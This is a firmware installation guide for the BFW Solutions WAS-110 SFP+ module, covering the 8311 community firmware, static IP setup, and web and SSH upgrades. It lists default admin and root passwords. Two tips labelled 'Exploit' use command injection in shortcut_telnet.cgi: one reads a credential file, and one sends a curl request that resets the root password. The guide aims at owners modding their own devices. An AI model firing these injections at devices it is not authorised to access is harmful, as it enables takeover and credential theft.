---
date: 2024-03-21
categories:
  - WAS-110
  - BFW Solutions
---

# Install 8311 community firmware on the BFW Solutions WAS-110

<!-- more -->

!!! note
    As of firmware version __1.0.21__, the WAS-110 web UI and SSH default passwords have changed.

Out of the box, the WAS-110 isn't fully compatible with varying ISP OLT configurations; with issues ranging from 
vendor specific managed entities to VEIP to IEEE standards such as [802.1X] and [802.1ad].
Due to these incompabilities and discovered bugs, a community firmware[^1] was curated to fix any impeding issues[^2]. 

  [802.1X]: https://en.wikipedia.org/wiki/IEEE_802.1X
  [802.1ad]: https://en.wikipedia.org/wiki/IEEE_802.1ad

## Host setup

Plug the WAS-110 into a 10-gigabit compatible SFP+ host interface, such as a NIC, media converter, and/or network
switch.

### Download firmware

The community firmware comes in two (2) variants: *basic* and *bfw*; for the purposes of this guide, we'll focus on
the recommended <ins>basic</ins> firmware, which can be downloaded at:

<https://github.com/djGrrr/8311-was-110-firmware-builder/releases/latest>

The basic firmware consists of a vanilla MaxLinear [OpenWrt](https://openwrt.org/){ target="_blank" } 19.07 fork,
with the addition of the aformentioned fixes and customised luci web interfaces to ease masquerading.

### Extract download

The basic firmware files are archived by [7-Zip](https://www.7-zip.org/){ target="_blank" } and can be extracted with:

=== "Windows"

    ``` doscon
    > 7z x WAS-110_8311_firmware_mod_<version>_basic.7z
    ```

=== "macOS"

    !!! note
        The following commands assume [Homebrew](https://brew.sh){ target="_blank" } is installed.

    ``` console
    $ brew install sevenzip
    $ 7zz x WAS-110_8311_firmware_mod_<version>_basic.7z
    ```

=== "Linux"

    !!! note
        The following commands assume a Debian-based distribution.

    ``` console
    $ sudo apt-get install 7zip-full
    $ 7z x WAS-110_8311_firmware_mod_<version>_basic.7z #(1)!
    ```

    1. Replace `<version>` with the downloaded version.

### Set a static IP

The default IP of the WAS-110 listens at `192.168.11.1`; a static IP on the same `192.168.11.0/24` subnet must be
assigned to the host interface.

=== "Windows"

    !!! tip "Run Command Prompt as Administrator"

        1. Press <kbd>Win</kbd> + <kbd>R</kbd>
        2. In the Run dialog box, type `cmd` into the input field and then press
           <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Enter</kbd>. 

    ``` doscon hl_lines="2"
    > netsh interface ip show config
    > netsh interface ipv4 set address name="<interface name>" static 192.168.11.2 255.255.255.0 192.168.11.1
    ```

=== "macOS"

    ``` console hl_lines="2"
    $ sudo networksetup -listallnetworkservices
    $ sudo networksetup -setmanual <service> 192.168.11.2 255.255.255.0 192.168.11.1
    ```

=== "Linux"

    !!! note
        The following commands must be run as root `su -` or prepended with `sudo`.

    ``` console hl_lines="6"
    $ ip link show
    $ ethtool <interface>
    $ ip address show
    $ ip address flush dev <interface>
    $ ip route flush dev <interface>
    $ ip address add 192.168.11.2/24 dev <interface>
    $ ip address show dev <interface>
    ```

## Web UI upgrade <small>recommended</small> { #web-ui-upgrade data-toc-label="Web UI upgrade" }

### Web credentials

The default web credentials can be found in `/ptconf/param_ct.xml` and modifications from the web UI are stored in
`/ptconf/usrconfig_conf` as base64 encoded strings.

!!! warning
    Passwords have a maximum length of 16 characters which are not restricted by the web UI.

??? tip "Exploit to disclose the default credentials"
    
    Navigate to <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>

=== "&lt;= v1.0.20"

    | Username | Password       |
    | -------- | -------------- |
    | admin    | QsCg@7249#5281 |
    | user     | user1234       |

=== "v1.0.21"

    | Username | Password       |
    | -------- | -------------- |
    | admin    | BR#22729%635e9 |
    | user     | user1234       |

### Firmware upgrade

!!! danger
    The WAS-110 firmware upgrade utility on occasion has been known to soft-brick itself; a host device with serial
    breakout on SFP pins 2 (rx) and 7 (tx) will be required to recover.

![WAS-110 login](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_login.webp)


1. Within a web browser, navigate to 
   <https://192.168.11.1/html/main.html#admin/upgrade>{ target="_blank" }
   and, if asked, input the <em>admin</em> credentials. 

![WAS-110 firmware upgrade](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_upgrade.webp)

2. At the __Firmware Upgrade__ page, browse for `local-upgrade.img` from the extracted download, and click 
   __Upgrade__.

Patiently wait out the process, 4 to 5 minutes, until the web session becomes unresponsive.

??? tip "Run a continuous ping"
    To recieve an early indication that the WAS-110 has completed its upgrade reboot cycle, run a continuous ping:

    === "Windows"

        ``` doscon
        > ping -t 192.168.11.1
        ```

    === "macOS / Linux"

        ``` console
        $ ping 192.168.11.1
        ```

## Shell upgrade

### Shell credentials

=== "&lt;= v1.0.20"

    | Username | Password       |
    | -------- | -------------- |
    | root     | QpZm@4246#5753 |

=== "v1.0.21"

    !!! warning "The root password is not known at this time."

    ??? tip "Exploit to temporarily change the root password"
        Temporarily change the root password to `root`.

        === "Windows"

            ``` doscon
            > curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
            ```

        === "macOS / Linux"

            ``` console
            $ curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
            ```
### Local upgrade

The extracted `local-upgrade.tar` includes a <ins>safer</ins> upgrade script in comparison to the built-in web UI.

<h4>Enable SSH</h4>

SSH must be enabled from the web UI prior to running the shell commands.

![WAS-110 login](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_login.webp)

1. Within a web browser, navigate to <https://192.168.11.1/html/main.html#service/servicecontrol>{ target="_blank" }
   and, if asked, input the admin credentials. 

![WAS-110 services](install-8311-community-firmware-on-the-bfw-solutions-was-110/was_110_services.webp)

2. From the __Service Control__ page, check the __SSH__ checkbox and click __Save__.

<h4>Upgrade firmware</h4>

Run the following commands from the host terminal to upgrade to the 8311 community firmware.

```
scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar'
```

[^1]: <https://github.com/djGrrr/8311-was-110-firmware-builder>
[^2]: <https://github.com/djGrrr/8311-xgspon-bypass>

      <https://github.com/djGrrr/8311-was-110-firmware-builder/blob/master/mods/>
